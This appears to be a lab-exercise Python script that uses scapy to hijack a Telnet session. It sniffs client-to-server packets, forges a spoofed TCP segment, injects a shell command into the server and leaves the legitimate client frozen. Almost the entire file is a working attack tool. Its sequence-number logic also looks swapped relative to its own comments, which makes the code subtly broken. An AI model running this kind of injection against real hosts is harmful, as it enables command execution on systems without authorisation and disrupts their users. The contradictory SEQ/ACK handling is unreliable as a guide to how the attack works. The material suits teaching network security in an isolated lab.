#!/usr/bin/env python3
"""
Lab 6 — TCP Attacks
Task: Automated TCP session hijacking — inject a shell command into Telnet
Description:
    Waits for the victim to be actively typing in a Telnet session, then
    injects a spoofed TCP segment carrying a shell command (/bin/touch).
    The server executes the command as if the client typed it.

    After injection, the client's TCP stack becomes desynchronised:
    its expected ACK (from the server) will no longer match what the server
    sends, causing the legitimate client to freeze/hang while the server
    continues executing our injected command.

    Usage:
        sudo python3 hijacking_auto.py <client_ip> <server_ip>
    Example:
        sudo python3 hijacking_auto.py 10.9.0.6 10.9.0.5

    IMPORTANT: Type at least 10 characters in the Telnet session before
    running this script (or while it is waiting) so there are live data
    packets to sniff and extract the correct sequence numbers from.
"""

import sys
from scapy.all import IP, TCP, Raw, sniff, send, Packet

# =============================================================================
# Parse command-line arguments
# =============================================================================

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <client_ip> <server_ip>")
    sys.exit(1)

CLIENT_IP = sys.argv[1]   # e.g. 10.9.0.6
SERVER_IP = sys.argv[2]   # e.g. 10.9.0.5

# =============================================================================
# Announce intent
# =============================================================================

print("[*] Running SESSION HIJACKING attack...")
print(f"    Client : {CLIENT_IP}")
print(f"    Server : {SERVER_IP}:23 (Telnet)")
print("[*] Waiting for active Telnet data packets (type ~10 chars in Telnet first)...")
print()

# =============================================================================
# BPF filter — capture client→server Telnet data packets
# =============================================================================
# We need packets FROM the client so we can read the client's current SEQ
# and the server's expected ACK (which is the client's next byte offset).

myFilter = (
    f"tcp and src host {CLIENT_IP} and dst host {SERVER_IP} "
    f"and dst port 23"
)

# Hardcoded client source port — determined beforehand (e.g. from netstat or
# by sniffing the initial handshake).  Alternatively read from the first sniffed packet.
CLIENT_PORT = 0   # 0 = read dynamically from the first sniffed packet

# =============================================================================
# Injected payload
# =============================================================================
# The payload is a shell command terminated by \r (carriage return) which acts
# as the Enter key in a terminal.  Leading \r ensures any partial input on the
# server side is discarded before our command runs.

PAYLOAD = "\r/bin/touch /tmp/success\r"
# Effect: creates /tmp/success on the server, proving code execution.

# =============================================================================
# Sequence number desynchronisation — why the legitimate client freezes
# =============================================================================
# After we inject N bytes into the client→server stream:
#
#  Server's RCV.NXT advances by N (it processed our injected data).
#  Server sends ACK = client_seq + len(payload).
#
#  The legitimate client's SND.NXT has NOT advanced by N (it didn't send those
#  bytes).  So when the server's ACK arrives, it is N bytes AHEAD of what the
#  client expects as an acknowledgement.  The client sees a "future" ACK and
#  silently drops it.  From this point the client can never make progress —
#  every packet it sends is retransmitted, and every server ACK is discarded.
#  The Telnet terminal appears frozen/unresponsive.

# =============================================================================
# Hijack callback
# =============================================================================

hijack_done = False   # Inject only once

def hijack(pkt: Packet) -> None:
    global hijack_done, CLIENT_PORT

    if hijack_done:
        return

    if not (pkt.haslayer(TCP) and pkt.haslayer(Raw)):
        # We need a data-carrying packet to get correct SEQ/ACK numbers
        return

    # Read client's source port dynamically from the first matching packet
    if CLIENT_PORT == 0:
        CLIENT_PORT = pkt[TCP].sport

    # ------------------------------------------------------------------
    # Extract current sequence numbers
    # ------------------------------------------------------------------
    # pkt[TCP].seq  = client's current SND.NXT
    #               = next byte the server expects from the client
    # pkt[TCP].ack  = client's current RCV.NXT (bytes received from server)
    # len(pkt[Raw].load) = size of the data in this sniffed segment

    seq_num = pkt[TCP].ack                            # What the server expects next from client
    ack_num = pkt[TCP].seq + len(pkt[Raw].load)       # What we ACK back to the server

    # ------------------------------------------------------------------
    # Build the forged segment
    # ------------------------------------------------------------------
    ip  = IP(src=CLIENT_IP, dst=SERVER_IP)

    tcp = TCP(
        sport=CLIENT_PORT,           # Must match the established connection
        dport=23,                    # Telnet server port
        flags="A",                   # ACK — this is a data-carrying ACK segment
        seq=seq_num,                 # Client's next expected sequence number
        ack=ack_num,                 # Acknowledging data received from server
    )

    # Attach the shell command as the segment payload
    payload = Raw(load=PAYLOAD.encode())

    forged_pkt = ip / tcp / payload
    send(forged_pkt, verbose=False)

    hijack_done = True

    print(f"[+] Hijack packet sent!")
    print(f"    Spoofed src : {CLIENT_IP}:{CLIENT_PORT}")
    print(f"    Destination : {SERVER_IP}:23")
    print(f"    SEQ         : {seq_num} (0x{seq_num:08x})")
    print(f"    ACK         : {ack_num} (0x{ack_num:08x})")
    print(f"    Payload     : {PAYLOAD!r}  ({len(PAYLOAD)} bytes)")
    print(f"[+] Check /tmp/success on the server to confirm code execution.")
    print(f"[+] The legitimate Telnet client should now be frozen (desynchronised).")

# =============================================================================
# Start sniffing
# =============================================================================

sniff(
    filter=myFilter,
    prn=hijack,
    stop_filter=lambda p: hijack_done,   # Stop after first injection
)
